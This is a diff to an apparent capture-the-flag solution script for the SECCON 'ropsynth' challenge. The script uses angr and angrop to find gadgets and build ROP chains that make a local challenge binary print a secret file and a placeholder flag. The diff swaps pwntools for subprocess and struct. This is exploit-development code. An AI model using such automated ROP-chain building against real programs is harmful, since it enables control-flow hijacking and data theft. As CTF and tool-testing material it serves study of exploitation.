@@ -10,10 +10,10 @@
 # All this has to run 5 times, and should output the contents of the "secret" file each time.
 # After this, the server gives us the flag.
 
-
+import subprocess
+import struct
 import base64
-import sys
-import pwn
+import time
 
 import angr
 import angrop #pylint:disable=unused-variable
@@ -169,7 +169,7 @@ def get_gadgets():
     # that read() returns. This means that we need to move the return value of read(), which is in rax, to the third argument of
     # write(), rdx. Luckily, there is a "mov rdx, rax" gadget. We'll find it and insert it between the read and the write.
     mov_gadget = next(g for g in r.gadgets if g.reg_moves and g.reg_moves[0].from_reg == 'rax' and g.reg_moves[0].to_reg == 'rdx')
-    mov_chain = pwn.p64(mov_gadget.addr) + guard_solutions[mov_gadget.addr] #pylint:disable=no-member
+    mov_chain = struct.pack("<Q", mov_gadget.addr) + guard_solutions[mov_gadget.addr] #pylint:disable=no-member
     guarded_chains.insert(2, mov_chain)
 
     #
@@ -180,14 +180,21 @@ def get_gadgets():
 
 def test():
     #r = pwn.remote('ropsynth.pwn.seccon.jp', 10000)
-    r = pwn.process("./ropsynth.py", stderr=2)
+    #r = pwn.process("./ropsynth.py", stderr=2)
+    r = subprocess.Popen(["./ropsynth.py"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
 
     # We need to do the auto-rop thing 5 times.
     for _ in range(5):
-        print "STAGE:", r.readline()
+        r.stdout.read(6)
+        print "STAGE:", r.stdout.read(1)
+        r.stdout.read(3)
 
         # Get the gadgets
-        gadgets = r.readline().strip()
+        time.sleep(1)
+        gadgets = ""
+        while not gadgets.endswith('\n'):
+            gadgets += r.stdout.read(1)
+        gadgets = gadgets.strip()
 
         # Make our franken-elf
         make_elf(gadgets)
@@ -196,14 +203,14 @@ def test():
         chain = get_gadgets()
 
         # Send the gadgets
-        r.sendline(base64.b64encode(chain))
+        r.stdin.write(base64.b64encode(chain) + "\n")
 
         # Make sure things are good
-        status = r.readline().strip()
+        status = r.stdout.read(3).strip()
         assert status == "OK"
 
     # After 5 successful rop synths, the binary sends up the flag.
-    flag = r.readline().strip()
+    flag = r.stdout.read(128).strip()
     print "LOCAL FLAG:", flag
     assert flag == 'SECCON{HAHAHHAHAHAAHA}'
 
